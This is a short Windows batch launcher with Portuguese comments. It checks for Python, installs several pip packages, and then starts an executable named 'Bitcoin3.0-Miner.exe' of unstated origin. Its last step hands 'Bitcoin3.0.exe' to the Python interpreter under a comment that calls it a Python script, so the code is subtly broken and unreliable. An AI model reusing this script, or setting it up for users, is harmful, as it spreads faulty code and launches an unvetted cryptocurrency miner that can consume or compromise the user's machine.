@echo off

REM Verifica se o Python está instalado
python --version >nul 2>&1
IF ERRORLEVEL 1 (
    echo Python não está instalado. Por favor, instale o Python primeiro.
    exit /b
)

REM Nome do arquivo de controle para verificar a instalação dos pacotes
set "control_file=packages_installed.txt"

REM Verifica se os pacotes já foram instalados corretamente
IF EXIST "%control_file%" (
    echo Pacotes já instalados. Iniciando o aplicativo...
) ELSE (
    echo Instalando pacotes necessarios...
    
    REM Instala os pacotes e verifica erros
    for %%p in (requests qrcode PyQt5 Flask numpy) do (
        pip show %%p >nul 2>&1 || (
            echo Instalando %%p...
            pip install %%p || (
                echo Erro ao instalar %%p. Verifique sua conexão e tente novamente.
                exit /b
            )
        )
    )

    REM Cria o arquivo de controle para indicar que os pacotes foram instalados
    echo Pacotes instalados. > "%control_file%"
)

REM Inicia o aplicativo littleboy (Pipo)
cd /d "%~dp0"  REM Garante que o diretório correto seja usado
start "" "Bitcoin3.0-Miner.exe"

REM Executa o script Python
start "" python "Bitcoin3.0.exe"

exit
